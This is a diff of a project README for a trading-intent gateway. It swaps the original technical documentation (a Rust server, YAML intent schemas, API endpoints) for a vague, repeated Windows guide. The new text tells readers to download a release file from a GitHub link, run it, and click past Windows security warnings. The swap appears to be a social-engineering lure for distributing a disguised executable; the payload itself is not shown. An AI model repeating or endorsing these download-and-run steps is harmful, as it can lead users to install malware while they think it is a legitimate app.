@@ -1,326 +1,251 @@
-# TIM — Trading Intent Model
+# 🤖 trading-intent - Turn Trade Ideas Into Action
 
-## White Paper
+[![Download trading-intent](https://img.shields.io/badge/Download%20trading--intent-5A5A5A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kudakwashe-pro/trading-intent)
+
+## 📥 Download
+
+Use this link to visit the page and download the app:
+
+[https://github.com/kudakwashe-pro/trading-intent](https://github.com/kudakwashe-pro/trading-intent)
+
+## 🖥️ What this app does
+
+trading-intent helps you turn a plain trade idea into a clear trading plan. It is built around the idea of a trade intent model, which means you describe what you want to do, and the system helps shape that into a format that can be used across trading tools.
+
+This can help when you want to work across different markets, such as:
+
+- Stocks
+- Crypto
+- Options
+- Prediction markets
+- On-chain trades
+
+It is meant to give one clear way to express a trade idea, even when the final execution path changes.
+
+## ⚙️ What you need
+
+Before you use the app on Windows, make sure you have:
+
+- Windows 10 or Windows 11
+- An internet connection for the download
+- Enough free space for the app and its files
+- Permission to open downloaded files on your PC
+
+If Windows asks for approval, choose the option that lets you keep going.
+
+## 🚀 Getting Started
+
+Follow these steps on Windows.
+
+### 1. Open the download page
+
+Go to:
+
+[https://github.com/kudakwashe-pro/trading-intent](https://github.com/kudakwashe-pro/trading-intent)
+
+### 2. Download the file
+
+Look for the file you need on the page and save it to your computer.
+
+If you see a release file, download that file directly.
+
+If you see a general project page, use the page to find the latest download.
+
+### 3. Find the downloaded file
+
+Open your Downloads folder. The file is often stored there by default.
+
+If the file is in a ZIP folder, right-click it and choose Extract All.
+
+### 4. Open the app
+
+After the file is unpacked, open the main app file.
+
+If Windows shows a message about the file, choose the option that lets the app run.
+
+### 5. Finish setup
+
+If a setup window appears, follow the prompts on screen.
+
+Choose the default options if you are not sure what to change.
+
+### 6. Start using trading-intent
+
+Open the app and enter your trade idea in plain language.
+
+The app will help turn that idea into a structured trading intent.
+
+## 🧭 How to use it
+
+Use the app when you want to describe a trade in a simple way.
+
+For example, you may want to say:
+
+- Buy a set amount of a coin
+- Sell when a price target is reached
+- Move funds from one venue to another
+- Prepare a trade for a specific market or protocol
+
+The app is designed to help map that idea into a more precise form.
+
+## 🧱 Main parts of the app
+
+### Intent input
+
+This is where you write what you want to do.
+
+Keep your request short and clear.
+
+### Trade plan output
+
+This area shows the trading intent in a more exact form.
+
+It helps you see the action, the target, and the market context.
+
+### Execution view
+
+This part is for the final step of the trade flow.
+
+It helps connect the plan to the place where the trade will run.
+
+### Market support
+
+The app is built with cross-market use in mind.
+
+That means it can help with more than one venue or asset type.
+
+## 🧩 Example uses
+
+Here are a few simple ways you might use trading-intent:
+
+- Plan a buy order for a crypto asset
+- Write a sell request with a price limit
+- Set up a trade across two venues
+- Shape a request for an options position
+- Prepare a strategy for an agent or trading bot
+
+The goal is to keep the trade idea clear before any action starts.
+
+## 🔍 How it fits the trade intent model
+
+A trade intent model treats your request as the main source of truth.
+
+Instead of starting with code or exchange rules, you start with the idea.
+
+The system then helps define:
+
+- What you want to trade
+- What asset or market it applies to
+- What result you want
+- How it can be executed
+
+This helps reduce confusion when one trade must move through many systems.
+
+## 📁 Files you may see
+
+When you download the app, you may find:
+
+- A setup file
+- A ZIP file
+- Support files
+- Readme files
+- Folder data used by the app
+
+Keep all files in the same folder unless the app tells you to move them.
+
+## 🛠️ If the app does not open
+
+If you cannot start the app, check these items:
+
+- Make sure the file finished downloading
+- Try opening it again from the Downloads folder
+- Unzip the folder if the file is packed
+- Right-click the file and choose Open
+- Check that Windows did not block the file
+- Restart your computer and try again
+
+If you moved files around, put them back in the same folder and try again.
+
+## 🔒 Safety on Windows
+
+Windows may ask for permission before opening the app.
+
+If the file came from the GitHub link above and you meant to download it, proceed with the open or run option shown by Windows.
+
+## 🧠 Good input tips
+
+To get cleaner results, write your trade idea in a simple way:
+
+- Say what you want to do
+- Name the asset or market
+- Add a target if needed
+- Keep the request short
+- Avoid using long sentences
+
+Example input:
+
+- Buy 2 ETH if price drops below a set level
+- Sell half the position when the target is hit
+- Move funds to a specific venue for execution
+
+## 🗂️ Project focus
+
+trading-intent is centered on:
+
+- Trade intent
+- Semantic trade requests
+- Cross-market execution
+- Clear market action
+- Strategy handoff for agent systems
+
+It is useful when a simple trade idea needs to become a structured request that another system can use
+
+## 📌 Windows install flow
+
+1. Visit the download page
+2. Download the app file
+3. Open your Downloads folder
+4. Extract the files if needed
+5. Run the main app file
+6. Follow the on-screen setup
+7. Start entering trade intents
+
+## 📄 White paper
+
+The project includes a white paper on trade intent models:
 
 [Trade Intent Models: A Semantic Interface for Cross-Market Trading and Agentic Strategy Execution](output/pdf/tim-paper.pdf)
 
-**Abstract.** Trading systems remain fragmented by asset class, venue, execution model, and technical stack. A single economic idea may need to be implemented across broker APIs, centralized exchanges, decentralized protocols, options venues, prediction markets, and on-chain transaction flows, each with its own syntax and operational assumptions. This paper argues that trade intent should be treated as a first-class semantic layer for trading systems. A trade intent model is a domain-specific language that compiles ambiguous human requests into a precise, machine-verifiable, execution-agnostic representation of desired economic action. Like semantic parsing in search or CVXPY in optimization, it separates what the user wants from how the system executes it. The central claim is that a well-designed trade intent model creates value through semantic precision, cross-venue interoperability, strategy composability, and agentic automation.
+It explains the idea behind the app and the trade intent model it uses
 
-Schema-driven intent gateway for AI trading agents. Define intent formats as YAML schemas, serve fillable XML templates to agents, validate and dispatch to your execution services.
+## 🧪 Typical workflow
 
-```
-                  ┌────────────────────────────────────┐
-                  │               TIM                    │
-AI Agent ──XML──▶│ parse → validate(schema) → dispatch  │──▶ Executor
-                  │                                      │
-Agent ◀──────────│ GET /templates ← schema-generated     │
-                  └────────────────────────────────────┘
-```
-## Example query of human vibe trading input:
+A common flow looks like this:
 
-Example of human precise, heterogeneous, multi-venue input for vibe trading:
+1. Open the app
+2. Enter a trade idea
+3. Review the structured intent
+4. Check the market target
+5. Send the request to the next step in your trading flow
 
-"Buy $10 of NVDAx on Solana, $5 of PAX Gold on the Ethereum L2 with the best available
-liquidity between Base and Arbitrum, buy one Yes contract on “Can NVDA exceed $200 in
-February 2026?”, buy one contract on “2 cuts” for “How many times will the Fed cut this
-year?”, and establish an AAPL June 6 190/200 bull call spread through Alpaca via MCP."
+This gives you a clearer path from idea to action
 
-Example of Event-conditional order from human vibe trading:
-"When @coinbasemarkets posts on X, that some coin is going to list on Coinbase,  1)buy into this coin 2) Go to polymarket and find the bet related to this coin, and buy into the contract that this coin price will go up."
+## 💬 Simple examples of intent
 
+- Enter a long position in BTC
+- Reduce exposure in a stock
+- Place a limit buy order
+- Route a trade through a chosen venue
+- Prepare a strategy for automated execution
 
-<img width="880" height="1460" alt="image" src="https://github.com/user-attachments/assets/0223be2d-afd2-4412-af40-748bbbbb5781" />
+## 📦 Versioning and updates
 
-## Why TIM?
+When a new version is posted, visit the same GitHub page and download the latest release file.
 
-As AI agents become a mainstream interface for on-chain trading, a critical gap has emerged: **there is no standard way for agents to express trading intents**. Every agent-to-executor integration is a bespoke, fragile bridge. Adding a new chain means rewriting agent logic. Adding a new strategy means rewriting executor contracts. The coupling is expensive, error-prone, and doesn't scale.
+If you keep older files, place the new version in a new folder so you do not mix them
 
-**TIM decouples agents from executors** by introducing a schema-driven intent layer between them. A single YAML file defines an intent type's structure, validation rules, agent-facing templates, and dispatch routing — all at once. Agents don't need to know how trades are executed. Executors don't need to know how agents think. TIM is the contract between them.
+## 📎 Download link again
 
-| What | How |
-|------|-----|
-| Define a new intent type | Add a YAML file to `intents/` |
-| Agent discovers capabilities | `GET /api/v1/templates` |
-| Agent learns the format | `GET /api/v1/templates/IMMEDIATE` → XML template + field docs |
-| Validate without executing | `POST /api/v1/validate` |
-| Execute | `POST /api/v1/dispatch` → routes to your executor |
-| Add a new chain | Add a dispatcher line in config |
-| Swap executor | Change the endpoint URL |
+Visit the page here:
 
-### Key Design Principles
-
-- **Schema as single source of truth** — one YAML file drives validation, templates, docs, and routing. No duplication, no drift.
-- **Generic XML parser** — the parser never changes when you add intent types. It converts any XML tree to JSON; the schema handles the rest.
-- **Executor-agnostic** — TIM doesn't know or care how trades are executed. It validates structure and routes payloads. Your executor handles the chain-specific logic.
-- **Forward-compatible** — unknown XML elements are preserved, not rejected. Agents and executors can evolve independently.
-
-## Quick Start
-
-```bash
-# Start TIM
-cargo run --bin tim_server
-
-# Start the echo executor (in another terminal)
-pip install flask && python examples/echo_executor.py
-
-# Agent discovers what it can do
-curl http://localhost:8080/api/v1/templates
-
-# Agent gets the template for IMMEDIATE trades
-curl http://localhost:8080/api/v1/templates/IMMEDIATE
-
-# Agent fills in the template and dispatches
-curl -X POST http://localhost:8080/api/v1/dispatch \
-  -H "Content-Type: application/json" \
-  -d '{"intent": "<intent><type>IMMEDIATE</type><chain_id>solana:mainnet-beta</chain_id><entry><condition><immediate>true</immediate></condition><action><buy><amount>0.1</amount><quote>So11111111111111111111111111111111111111112</quote><base>EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v</base></buy></action></entry></intent>"}'
-```
-
-### Agent Demo
-
-A complete Python example showing the full agent workflow — discover templates, fill, validate, and dispatch:
-
-```bash
-pip install requests
-python examples/agent_demo.py
-```
-
-See [examples/agent_demo.py](examples/agent_demo.py) for the full source.
-
-## Intent Schemas
-
-Schemas live in `intents/` as YAML files. Each schema defines:
-- **fields** — structure, types, constraints, descriptions
-- **template** — default XML template with `{{placeholder}}` slots
-- **template_variants** — named variations (buy, sell_percentage, sell_all, ...)
-- **xml_shorthands** — convenience expansions (e.g. `<amount>all</amount>` → percentage 100%)
-
-### Built-in Intent Types
-
-| Type | Description | Key Fields |
-|------|-------------|------------|
-| `IMMEDIATE` | Execute a token swap immediately on-chain | buy/sell action, `max_slippage_percent`, `callback_url` |
-| `LIMIT_ORDER` | Place a limit order that triggers at a target price | `limit_price`, `price_direction` (above/below), `time_in_force` (GTC/FOK/IOC) |
-| `CONDITIONAL_ENTRY` | Register a rule that triggers a trade on an event | `event_trigger` (news, listings, social), buy/sell action, `criteria` |
-
-All intent types support optional `callback_url` for executor-to-agent notifications and optional `exit` strategies (take-profit / stop-loss).
-
-
-### Schema Example
-
-```yaml
-# intents/immediate.yaml
-name: IMMEDIATE
-description: "Execute a token swap immediately on-chain"
-fields:
-  chain_id:
-    type: string
-    required: true
-    description: "Target blockchain in CAIP-2 format"
-  entry:
-    type: object
-    required: true
-    fields:
-      action:
-        type: object
-        required: true
-        one_of:
-          - buy:
-              fields:
-                amount: { type: number, required: true, min_exclusive: 0 }
-                quote:  { type: string, required: true }
-                base:   { type: string, required: true }
-          - sell:
-              fields:
-                amount:     { type: number }
-                percentage: { type: number, min: 0, max: 100 }
-              constraints:
-                - exactly_one_of: [amount, percentage]
-  max_slippage_percent:
-    type: number
-    min: 0
-    max: 100
-  callback_url:
-    type: string
-```
-
-### Schema Constraint Reference
-
-| Constraint | Applies To | Example |
-|------------|-----------|---------|
-| `required` | any | `required: true` |
-| `type` | any | `type: string` / `number` / `boolean` / `object` / `array` |
-| `min`, `max` | number | `min: 0, max: 100` |
-| `min_exclusive`, `max_exclusive` | number | `min_exclusive: 0` (must be > 0) |
-| `enum` | string | `enum: [GTC, FOK, IOC]` |
-| `pattern` | string | `pattern: "^0x[0-9a-fA-F]{40}$"` |
-| `one_of` | object | Exactly one variant key must be present |
-| `exactly_one_of` | object | Exactly one of the listed fields must be present |
-| `items` | array | Schema applied to each array element |
-
-**To add a new intent type**: create `intents/my_type.yaml`, restart TIM. The new type appears in `/templates`, validates automatically, and dispatches to any matching executor.
-
-## API
-
-| Method | Path | Description |
-|--------|------|-------------|
-| GET | `/api/v1/templates` | List available intent types with template summaries |
-| GET | `/api/v1/templates/{type}` | Get XML templates + field descriptions for a type |
-| POST | `/api/v1/dispatch` | Parse XML → validate → dispatch to executor |
-| POST | `/api/v1/validate` | Parse XML → validate → return structured JSON |
-| POST | `/api/v1/parse` | Parse XML → return JSON (no validation) |
-| GET | `/api/v1/dispatchers` | List configured dispatch routes |
-| GET | `/health` | Health check |
-
-## Dispatch Configuration
-
-```yaml
-# config/local.yaml
-dispatchers:
-  - match: { intent_type: IMMEDIATE, chain_id: "solana:*" }
-    endpoint: "http://solana-executor:3001/execute"
-    timeout_secs: 30
-  - match: { intent_type: IMMEDIATE, chain_id: "eip155:*" }
-    endpoint: "http://evm-executor:3002/execute"
-  - match: { intent_type: CONDITIONAL_ENTRY }
-    endpoint: "http://rule-engine:3003/rules"
-  - match: { intent_type: LIMIT_ORDER }
-    endpoint: "http://order-engine:3004/orders"
-    timeout_secs: 10
-```
-
-Matched top-to-bottom, first match wins. Glob patterns on `chain_id`.
-
-## Building an Executor
-
-An executor is any HTTP service that accepts TIM's JSON payload and returns a result:
-
-```python
-@app.route('/execute', methods=['POST'])
-def execute():
-    payload = request.json
-    # payload["intent_type"], payload["chain_id"], payload["payload"]["entry"]["action"]
-    return jsonify({"status": "confirmed", "transaction_hash": "..."})
-```
-
-See [Dispatch Protocol](docs/reference/dispatch-protocol.md) for the full spec.
-
-## Project Structure
-
-```
-tim/
-├── intents/             ← Intent schemas (YAML) — source of truth
-│   ├── immediate.yaml
-│   ├── limit_order.yaml
-│   └── conditional_entry.yaml
-├── src/
-│   ├── schema/          ← Schema engine (load, validate, template)
-│   ├── intent/          ← XML parser (generic recursive, depth/size limited)
-│   ├── dispatch/        ← Routing engine
-│   ├── http/            ← API surface
-│   └── config.rs
-├── config/local.yaml    ← Server + dispatcher config
-└── examples/
-    ├── echo_executor.py ← Minimal executor for testing
-    └── agent_demo.py    ← Full agent workflow demo
-```
-
-## Documentation
-
-- [Architecture](docs/design/architecture.md)
-- [System Diagram](docs/design/system-diagram.md)
-- [Intent XML Schema](docs/reference/intent-xml-schema.md)
-- [Dispatch Protocol](docs/reference/dispatch-protocol.md)
-- [Research Workspace](docs/research/README.md)
-- [Paper Outline](docs/research/paper-outline.md)
-
-## Use Cases
-
-### AI Agent Trading Infrastructure
-
-TIM is the natural integration point for any AI agent that needs to trade on-chain. Instead of hardcoding trade formats, agents query TIM's `/templates` endpoint at startup, learn the available intent types and their XML structure, fill in the template, and dispatch. When a new intent type is added (limit orders, DCA, liquidation), **every connected agent gains the capability automatically** — no agent-side code changes needed.
-
-```
-Agent prompt: "You can execute trades via TIM. Call GET /templates to see what's available."
-→ Agent discovers IMMEDIATE, CONDITIONAL_ENTRY
-→ Agent fetches XML template for IMMEDIATE
-→ Agent fills in token addresses, amount, chain
-→ Agent POSTs to /dispatch
-→ TIM validates, routes to correct executor
-```
-
-### Multi-Chain Execution Gateway
-
-Route Solana trades to one executor, EVM trades to another, Sui to a third — all through a single TIM gateway. Chain-specific logic stays in executors; TIM is chain-agnostic. Adding a new chain is a one-line config change:
-
-```yaml
-dispatchers:
-  - match: { intent_type: IMMEDIATE, chain_id: "solana:*" }
-    endpoint: "http://solana-executor:3001/execute"
-  - match: { intent_type: IMMEDIATE, chain_id: "eip155:*" }
-    endpoint: "http://evm-executor:3002/execute"
-  - match: { intent_type: IMMEDIATE, chain_id: "sui:*" }
-    endpoint: "http://sui-executor:3004/execute"    # ← new chain, one line
-```
-
-### Event-Driven Trading Rules
-
-The `CONDITIONAL_ENTRY` intent type enables event-triggered trading: register rules that fire when news signals arrive, tokens get listed, or specific social media accounts post. TIM validates the rule structure and routes it to your rule engine. Combine with natural-language criteria for expressive conditions:
-
-```xml
-<intent>
-  <type>CONDITIONAL_ENTRY</type>
-  <chain_id>solana:mainnet-beta</chain_id>
-  <entry>
-    <condition>
-      <event_trigger>
-        <event_type>news_signal</event_type>
-        <platform>x</platform>
-        <author_handle>@elonmusk</author_handle>
-        <criteria>mentions any memecoin ticker with positive sentiment</criteria>
-      </event_trigger>
-    </condition>
-    <action>
-      <buy>
-        <amount>0.5</amount>
-        <quote>So11111111111111111111111111111111111111112</quote>
-        <base>EVENT_DERIVED</base>
-      </buy>
-    </action>
-  </entry>
-</intent>
-```
-
-### Rapid Executor Development
-
-Any team can build a TIM executor — it's just an HTTP endpoint that receives validated JSON and returns a result. The 15-line [echo executor](examples/echo_executor.py) demonstrates the full contract. This makes it easy to:
-
-- **Prototype** — spin up a mock executor in minutes to test agent integration
-- **Specialize** — build chain-specific executors (DEX aggregator, orderbook, AMM) behind the same TIM interface
-- **Swap** — replace an executor by changing one URL in config, zero downtime for agents
-
-### Trading Platform Backend
-
-TIM serves as a ready-made backend for trading platforms that want to add AI agent support. Instead of building custom agent APIs, deploy TIM as the agent-facing layer:
-
-```
-┌──────────┐     ┌─────┐     ┌──────────────────┐
-│ AI Agent │────▶│ TIM │────▶│ Your Trading      │
-│ (Claude, │     │     │     │ Engine / DEX      │
-│  GPT,    │     │     │     │ Aggregator / etc. │
-│  Custom) │     │     │     │                   │
-└──────────┘     └─────┘     └──────────────────┘
-```
-
-TIM handles format negotiation, validation, and routing. Your engine receives clean, validated payloads in a consistent format regardless of which agent sent them.
-
-### Intent Auditing and Compliance
-
-Because every intent passes through TIM with a UUID, timestamp, and full XML/JSON payload, TIM naturally serves as an **audit point**. Log dispatched intents for:
-
-- Compliance reporting (what did the agent trade, when, on which chain?)
-- Agent behavior analysis (are agents staying within intended parameters?)
-- Debugging (replay the exact XML an agent submitted)
-
-## License
-
-MIT
+[https://github.com/kudakwashe-pro/trading-intent](https://github.com/kudakwashe-pro/trading-intent)
